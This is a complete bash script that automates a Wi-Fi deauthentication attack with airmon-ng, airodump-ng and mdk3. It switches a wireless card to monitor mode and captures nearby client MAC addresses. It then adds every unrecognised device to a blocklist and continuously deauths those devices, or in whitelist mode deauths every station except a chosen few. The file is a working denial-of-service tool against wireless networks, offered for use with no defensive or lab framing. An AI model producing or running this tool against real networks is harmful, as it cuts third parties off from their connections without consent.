#!/bin/bash

# Set the temporary folder for storing capture files
TEMP_DIR="./temp_capture_files"

# Set the whitelist and blocklist files
WHITELIST="whitelist.txt"
BLOCKLIST="blocklist.txt"

# Ensure required programs exist
require_cmds() {
    for cmd in iw airmon-ng airodump-ng mdk3 awk grep sed; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "Error: required tool '$cmd' is not installed or not in PATH."
            exit 1
        fi
    done
}

# Ensure the temporary directory and files exist
setup_files() {
    if [ ! -d "$TEMP_DIR" ]; then
        mkdir -p "$TEMP_DIR"
        echo "Created temporary folder: $TEMP_DIR"
    fi

    if [ ! -f "$WHITELIST" ]; then
        touch "$WHITELIST"
        echo "Created whitelist file: $WHITELIST"
    fi

    if [ ! -f "$BLOCKLIST" ]; then
        touch "$BLOCKLIST"
        echo "Created blocklist file: $BLOCKLIST"
    fi
}

# Validate MAC address format (XX:XX:XX:XX:XX:XX or with -)
validate_mac() {
    if ! [[ "$1" =~ ^([0-9A-Fa-f]{2}([:-])){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid MAC address format: $1. Please try again."
        return 1
    fi
    return 0
}

# Add MAC addresses interactively to whitelist
add_whitelist_interactive() {
    while true; do
        echo -n "Enter the MAC address of the device you want to allow (e.g., 00:11:22:33:44:55): "
        read -r MAC_ADDRESS
        [ -z "$MAC_ADDRESS" ] && continue

        if validate_mac "$MAC_ADDRESS"; then
            # Normalize to lower-case and colon-separated
            MAC_NORM=$(echo "$MAC_ADDRESS" | tr '[:upper:]' '[:lower:]' | sed 's/-/:/g')
            if ! grep -Fxq "$MAC_NORM" "$WHITELIST"; then
                echo "$MAC_NORM" >> "$WHITELIST"
                echo "Added $MAC_NORM to the whitelist."
            else
                echo "$MAC_NORM is already in whitelist."
            fi
        fi

        echo -n "Do you want to add another MAC address? (yes/no): "
        read -r ADD_MORE
        if [[ "${ADD_MORE,,}" != "yes" ]]; then
            break
        fi
    done
}

# Ask whether to use whitelist or blocklist
ask_list_type() {
    while true; do
        echo -n "Do you want to use the whitelist or blocklist? (w for whitelist / b for blocklist): "
        read -r LIST_TYPE
        case "$LIST_TYPE" in
            w|b) LIST_TYPE_CHOICE="$LIST_TYPE"; return 0 ;;
            *) echo "Invalid input. Please enter 'w' for whitelist or 'b' for blocklist." ;;
        esac
    done
}

# Try to find an existing monitor interface, or convert a regular wlan to monitor
enable_monitor_mode() {
    # Try to find existing monitor interface
    MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'mon|mon[0-9]*' | head -n1 || true)

    if [ -z "$MONITOR_INTERFACE" ]; then
        INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E '^wlan[0-9]+' | head -n1 || true)

        if [ -z "$INTERFACE" ]; then
            echo "No wireless interfaces found. Exiting."
            exit 1
        fi

        echo "Killing interfering processes and starting monitor on $INTERFACE..."
        airmon-ng check kill >/dev/null 2>&1 || true
        if ! airmon-ng start "$INTERFACE" >/dev/null 2>&1; then
            echo "Error: Failed to switch interface to monitor mode."
            exit 1
        fi

        # re-detect monitor interface name
        sleep 1
        MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'mon|mon[0-9]*' | head -n1 || true)

        if [ -z "$MONITOR_INTERFACE" ]; then
            # some airmon-ng versions append "mon" to original name (e.g., wlan0mon)
            MONITOR_INTERFACE="${INTERFACE}mon"
            if ! ip link show "$MONITOR_INTERFACE" >/dev/null 2>&1; then
                echo "Error: No monitor interface found after activation."
                exit 1
            fi
        fi
    else
        echo "Found active monitor interface: $MONITOR_INTERFACE"
    fi
}

# Stop monitor mode (attempt)
stop_monitor_mode() {
    if [ -n "$MONITOR_INTERFACE" ]; then
        echo "Stopping monitor interface $MONITOR_INTERFACE..."
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1 || true
    fi
}

# Clean up background processes and temp files
cleanup() {
    echo "Cleaning up..."
    # kill known background pids if set
    if [ -n "$AIRODUMP_PID" ]; then
        kill "$AIRODUMP_PID" >/dev/null 2>&1 || true
    fi
    if [ -n "$MDK3_PID" ]; then
        kill "$MDK3_PID" >/dev/null 2>&1 || true
    fi
    # remove temp captures
    rm -f "$TEMP_DIR"/capture* "$TEMP_DIR"/current_capture.csv >/dev/null 2>&1
    stop_monitor_mode
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

# Capture for a short period and create a cleaned CSV we can parse
capture_once() {
    local outbase="$TEMP_DIR/capture"
    # remove old files
    rm -f "${outbase}"-01.csv "${outbase}"-01.kismet.csv "${outbase}"-01.kismet.netxml >/dev/null 2>&1

    echo "Starting airodump-ng for ${CAPTURE_TIME}s to gather clients..."
    airodump-ng --write-interval 1 --write "$outbase" --output-format csv "$MONITOR_INTERFACE" >/dev/null 2>&1 &
    AIRODUMP_PID=$!
    sleep "$CAPTURE_TIME"
    # stop airodump
    kill "$AIRODUMP_PID" >/dev/null 2>&1 || true
    wait "$AIRODUMP_PID" 2>/dev/null || true

    local csvfile="${outbase}-01.csv"
    if [ ! -f "$csvfile" ]; then
        echo "Error: Capture file not found ($csvfile)."
        return 1
    fi

    # create a stable copy
    cp "$csvfile" "$TEMP_DIR/current_capture.csv"
    echo "Capture saved to $TEMP_DIR/current_capture.csv"
    return 0
}

# Parse clients (Station MACs) from current_capture.csv
# Output: lines of "client_mac,bssid" (normalized lower-case colon format)
parse_clients() {
    local csv="$TEMP_DIR/current_capture.csv"
    # find the "Station MAC" header (case-insensitive), then print lines after it where NF>1
    awk -F',' '
    BEGIN{IGNORECASE=1}
    tolower($1) ~ /station mac/ {p=1; next}
    p && NF>1 {
        # column 1 = Station MAC, column 6 = BSSID (may be empty)
        mac=$1; bssid=$6;
        # trim spaces
        gsub(/^[ \t]+|[ \t]+$/,"",mac);
        gsub(/^[ \t]+|[ \t]+$/,"",bssid);
        if (mac != "") {
            print tolower(mac) "," tolower(bssid)
        }
    }
    ' "$csv" | sed 's/-/:/g' | sort -u
}

# Update blocklist by adding clients not in whitelist
update_blocklist_from_capture() {
    local clients
    clients=$(parse_clients) || return 1
    if [ -z "$clients" ]; then
        echo "No clients found in capture."
        return 0
    fi

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        client_mac="${line%%,*}"
        # exact-match check in whitelist
        if ! grep -Fxq "$client_mac" "$WHITELIST"; then
            if ! grep -Fxq "$client_mac" "$BLOCKLIST"; then
                echo "$client_mac" >> "$BLOCKLIST"
                echo "Added $client_mac to the blocklist."
            fi
        fi
    done <<< "$clients"
}

# Start mdk3 with proper args depending on mode
start_mdk3_attack() {
    if [[ "$LIST_TYPE_CHOICE" == "b" ]]; then
        # mdk3 expects a file of MACs for -b (blacklist)
        echo "Starting mdk3 deauth attack using blocklist file: $BLOCKLIST"
        mdk3 "$MONITOR_INTERFACE" d -b "$BLOCKLIST" >/dev/null 2>&1 &
        MDK3_PID=$!
    else
        echo "Starting mdk3 deauth attack using whitelist file: $WHITELIST (mode: whitelist)"
        mdk3 "$MONITOR_INTERFACE" d -w "$WHITELIST" >/dev/null 2>&1 &
        MDK3_PID=$!
    fi
    echo "mdk3 PID: $MDK3_PID"
}

# Main flow
main() {
    require_cmds
    setup_files

    # Let user add initial whitelist entries (optional)
    echo -n "Do you want to add whitelist MACs now? (yes/no): "
    read -r ADD_NOW
    if [[ "${ADD_NOW,,}" == "yes" ]]; then
        add_whitelist_interactive
    fi

    ask_list_type

    # capture time in seconds for each airodump-run (adjust if needed)
    CAPTURE_TIME=12

    enable_monitor_mode

    if [[ "$LIST_TYPE_CHOICE" == "b" ]]; then
        echo "Using blocklist mode. We'll capture clients and add unknown ones to $BLOCKLIST."
        # loop: capture -> update blocklist -> sleep -> repeat
        while true; do
            if capture_once; then
                update_blocklist_from_capture
            fi
            echo "Cycle complete. Sleeping before next capture..."
            sleep 5
        done &

        # let the background updater run a bit to populate blocklist, then start mdk3
        sleep 8
        start_mdk3_attack

    else
        # whitelist mode: directly run mdk3 with whitelist (no parsing required)
        echo "Using whitelist mode. mdk3 will deauth all stations except those in $WHITELIST"
        start_mdk3_attack
        # Optional: start airodump-ng for live monitoring (foreground)
        echo "Starting airodump-ng monitor (press Ctrl+C to stop)..."
        airodump-ng "$MONITOR_INTERFACE"
    fi

    # wait for background processes (mdk3 / updater)
    wait
}

main "$@"